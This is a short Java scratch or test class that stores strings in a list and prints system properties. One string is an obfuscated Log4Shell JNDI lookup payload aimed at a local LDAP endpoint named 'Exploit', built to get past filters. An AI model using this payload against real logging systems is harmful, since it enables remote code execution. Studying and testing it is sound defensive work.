import java.util.ArrayList;

public class calc {
    public static void main(String[] args)  {
        ArrayList<String> sites = new ArrayList<String>();
        sites.add("${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://127.0.0.1:1099/`Exploit");
        sites.add(":");
        System.out.println( sites.contains(":"));
        System.out.println("hello world");
        System.out.println(System.getProperties());
    }
}
